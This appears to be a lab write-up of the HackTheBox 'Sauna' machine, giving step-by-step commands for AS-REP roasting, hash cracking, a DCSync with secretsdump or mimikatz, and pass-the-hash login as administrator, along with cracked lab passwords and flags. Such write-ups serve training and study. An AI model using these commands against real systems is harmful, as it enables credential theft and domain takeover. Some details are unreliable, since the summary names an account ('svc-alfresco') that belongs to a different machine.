# Reconnaissance

First, i generated this template by using my script: [ch3ckkm8/Pentest-Auto-Report-](https://github.com/ch3ckkm8/Pentest-Auto-Report-)
```bash
python pentest_to_md.py 10.129.95.180 sauna.htb
```
## Add target to /etc/hosts
```bash
sudo sh -c "echo '10.129.95.180 sauna.htb' >> /etc/hosts"
```
## Nmap scan
```bash
sudo nmap -sC -sV sauna.htb
```

```bash

    - 3268
- Message signing enabled and required (smb2-security-mode)
I decided to inspect the `http` service first:

## Banner grabbing

```shell
whatweb sauna.htb
```

```bash
<http://sauna.htb> [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, 
HTTPServer[Microsoft-IIS/10.0], IP[10.129.95.180], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```
the `version` of the IIS server is `10.0`

found this CVE-2020-0645 to be related with this version
![](MediaFiles/Pasted%20image%2020250805150236.png)
![](MediaFiles/Pasted%20image%2020250805150246.png)

Trying to submit, with some random values, it displays this after hitting submit:
![](MediaFiles/Pasted%20image%2020250805150255.png)
### BurpSuite

Using burpsuite, i tried repeating the request on the contact page, and it appears that when using post method, it reponds with error `405` as shown in the screenshot below:
![](MediaFiles/Pasted%20image%2020250805150301.png)
but when i change the method from post to `GET` it responds with http code `200` !
![](MediaFiles/Pasted%20image%2020250805150305.png)
hm tried some exploits regarding the cve i mentioned above but had no luck, and i found nothing more about the iis part and i have no idea what went wrong.

Nothing was obvious about it … so i moved on

## DNS enum

### Zone-transfer

Tried zone transfer:
```shell
dig axfr @10.129.95.180 sauna.htb
```
but it failed

## SMB enum

### Anonymous Login

Tried anonymous login:
```shell
smbmap -H 10.129.95.180
```

```shell
[+] Finding open SMB ports....
[+] User SMB session established on 10.129.95.180...
[+] IP: 10.10.10.175:445        Name: 10.10.10.175

        ----                      -----------     -------
[!] Access Denied
```
 found nothing and access was denied.

## LDAP enum

```bash
ldapsearch -LLL -x -H ldap://sauna.htb -s base namingcontexts
```

```bash
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
```

## Finding valid users

i will use `ldapsearch` for this:
```bash
ldapsearch -LLL -x -H ldap://sauna.htb -b "DC=EGOTISTICAL-BANK,DC=LOCAL" "objectclass=user" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt
```

the user list gathered is:
```bash
fsmith
scoins
sdriver
btayload
hbear
skerb
```
Alternatively, for this step we could have used kerbrute to find valid users.

# Foothold

### Finding accounts with pre-authentication disabled

We can use the [GetNPUser.py](http://getnpuser.py/) script from impacketto see if any users have the privilege, if they do then the DC will respond.
or
we can revisit our ldap enumeration using `ldapsearch` where `DONT_REQ_PREAUTH` could be seen as enabled there too, reminder the snippet below: (just like the forest machine)
```bash
ldapsearch -LLL -x -H ldap://sauna.htb -b "DC=EGOTISTICAL-BANK,DC=LOCAL"
```

Here i found that DONT_REQ_PREAUTH flag is set! lets keep that in mind for later, and move on.

`GetNPUsers.py` identifies user accounts that:
- Have the **"Do not require Kerberos preauthentication"** flag set.
- Are therefore vulnerable to **AS-REP Roasting**
```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile user_list.txt -format hashcat -outputfile hashes.txt -dc-ip 10.129.95.180
```

it appears that we got the asrep hash for user `fsmith`!
```bash

```

or we could also do it via netexec:
```bash
nxc ldap 10.129.95.180 -u user_list.txt -p '' --asreproast hashes.txt
```
### Cracking the AS-REP hash

lets crack it now
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

the retrieved password is:
```bash
Thestrokes23
```

## Identify where we can login with those creds

lets use my script to bulk check all available services: https://github.com/ch3ckkm8/auto_netexec
```bash
./auto_netexec_bulk_creds_checker.sh sauna.htb 'fsmith' 'Thestrokes23'
```

```bash
[*] Checking if winrm port 5985 is open on sauna.htb...

```

so it seems that win-rm is open! lets login
```bash
evil-winrm -i sauna.htb -u 'fsmith' -p 'Thestrokes23'
```
login was successful! grabbed user flag `900c85036078cc85ed9144b2aaa35a96`

# Privesc

lets try to run bloodhound to get a better view of the AD
```bash
bloodhound-python -u 'fsmith' -p 'Thestrokes23' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All --zip
```

### Group Membership

we can also view user’s membership manually
```bash
whoami /groups
```

```bash
GROUP INFORMATION

```

also user accounts too
```bash
 net user
```

```bash

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

Lets continue with bloodhound
![](MediaFiles/Pasted%20image%2020250805150109.png)
our current user, does not have any outbound access control, and the group membership does not indicate anything useful

here we can also see the domain users
![](MediaFiles/Pasted%20image%2020250805150118.png)
Now lets run some queries to identify which account we should target

`Find Principals with DCSync Rights`
![](MediaFiles/Pasted%20image%2020250805150126.png)
it appears that `SVC_LOANMGR` has `DCSync` rights towards the domain!

`Find Kerberoastable Members of High Value Groups`
![](MediaFiles/Pasted%20image%2020250805150133.png)
Also, verifying the as-rep roasting part earlier about `FSMITH` :

`Find AS-REP Roastable Users (DontReqPreAuth)`
![](MediaFiles/Pasted%20image%2020250805150139.png)
`Find Shortest Paths to Domain Admins`
![](MediaFiles/Pasted%20image%2020250805150145.png)
So taking into consideration all the above screenshots, we should target `SVC_LOANMGR` and then attempt to `DCSync`, this was the path that stood out.

But how can we access SVC_LOANMGR ? we dont have any outbound access towards it from our user (fsmith). Also user `HSMITH` is kerberoastable but does not appear to have interesting outgoing access control towards other objects.

So, its time to find other ways to privesc… we could try using WinPEAS

### WinPEAS

Now so lets try uploading `WinPEAS` (type upload on winrm)

After inspecting the huge output of winpeas, what stood out was `AutoLogon credentials`, and it actually revealed plaintext password for the user we wanted to access! (the one with DCSync rights towards the domain)

```bash
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!   
```

the updated creds now are:
```bash
svc_loanmanager
Moneymakestheworldgoround!
```
Since we now have creds for this user, we can try to DCSync

### DCSync

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
```

aand we got admin’s NTLM hash!

### Login as Administrator (via Pass the Hash)

```bash
evil-winrm -i 10.129.95.180 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```
logged in successfully and grabbed root flag! `f92a2379a8e78ad8e9d5e7f8300b8d70`

## Extras

### Using Mimikatz instead of secretsdump

frist login as `SVC_LOANMGR`
```bash
evil-winrm -i 10.129.95.180 -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
```

then upload `mimikatz.exe` (from winrm just type upload filename), and then run
```bash
.\\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```
similarly grab the hash and login via pass the hash as administrator

# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap `scan` -> target is a DC, chose **smb** , **rpc** and **ldap** services to focus on
2. **enumerate** `DNS` -> zone-transfer failed
3. **enumerate** `SMB` -> anonymous login failed
4. **enumerate** `LDAP` -> found valid usernames
#### Foothold
5. `AS-REP roasting` was conducted and successfully got AS-REP hash (since the user has The **`Do not require Kerberos preauthentication`** flag enabled (since we had a list of usernames on the recon phase)
6. `cracked` the AS-REP hash, which revealed the password for a user (fsmith)
7. `correlated` the found user's  creds with the `win-rm` service
8. **logged in** via evil-winrm to host using on user **svc-alfresco**, and grabbed the ==user flag==.
#### Privesc
1. Run bloodhound, found that another user (svc_loanmgr) has `DCSync` rights towards the domain, but found no way to reach that user from the cuurently compromised one (fsmith)
2. WinPEAS was used to find potential privesc paths, which revealed `AutoLogon` credentials (plaintext password) for the account we were looking for! (svc_loanmgr)
3. `SecretsDump` was used, since we now have creds for this user, and according to bloodhound, this user has has `DCSync` rights towards the domain, revealing the NTML hash of the Administrator
4. using administrator's NTLM hash we **login** via evil-winrm and grab the ==root flag==!
##### Extras
3. on the 3rd step of the Privesc above, we could use `mimikatz` instead of `secretsdump`, by uploading it to the target and running it, revealing the NTLM hash of the Administrator.

---

# Sidenotes

What makes this one valuable in my notes, apart from other commonly used methodologies, was the usage of `WinPeas` to reveal sensitive information such as accounts with `AutoLogon credentials`.

To conclude, this machine was a good example where winpeas was the only (easy) way to identify the path towards privesc.
